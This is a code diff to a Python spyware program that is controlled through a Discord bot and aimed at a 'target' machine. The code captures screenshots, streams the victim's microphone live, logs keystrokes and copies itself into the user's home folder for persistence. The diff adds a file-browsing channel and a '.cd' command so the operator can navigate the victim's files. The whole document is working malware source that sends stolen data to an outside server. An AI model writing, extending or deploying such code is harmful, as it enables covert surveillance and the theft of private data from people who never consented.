@@ -4,6 +4,7 @@ from shutil import copy2
 import os
 import sys
 from PIL import ImageGrab
+from pathlib import Path
 import time
 from getpass import getuser
 import pyaudio
@@ -40,6 +41,7 @@ software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # 
 channel_ids = {
     'main': 831567586344697868,   # Paste here main channel ID for general output
     'spam': 831567654145097769,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
+    'file': 832701499301691423,   # Paste here file-related channel ID for browsing, downloading and uploading files
     'recordings': 831567740622995457,   # Paste here recording channel ID for microphone recordings storing
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
@@ -53,6 +55,7 @@ client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
+working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
     try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
@@ -122,19 +125,41 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc
-    match message.content:
-        case  '.ss':
-            await message.delete()
-            ImageGrab.grab(all_screens=True).save('ss.png')
-            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
-            os.system('del ss.png')
-        case '.join':
-            await message.delete()
-            vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
-            vc.play(PyAudioPCM())
-            await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
+    global channel_ids, vc, working_directory
 
+    if message.content == '.ss':
+        await message.delete()
+        ImageGrab.grab(all_screens=True).save('ss.png')
+        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
+        os.system('del ss.png')
+
+    elif message.content == '.join':
+        await message.delete()
+        vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
+        vc.play(PyAudioPCM())
+        await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
+
+    elif message.content == '.tree':
+        await message.delete()
+        if message.channel.id == channel_ids['file']:
+            print('yes')
+        else:
+            await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
+
+    elif message.content[:3] == '.cd':
+        await message.delete()
+        if message.channel.id == channel_ids['file']:
+            if message.content == '.cd':
+                await message.channel.send('```Syntax: .cd <directory>```')
+            else:
+                if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
+                    working_directory.append(message.content[4:])
+                    await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```')
+                else:
+                    reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
+
+        else:
+            await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
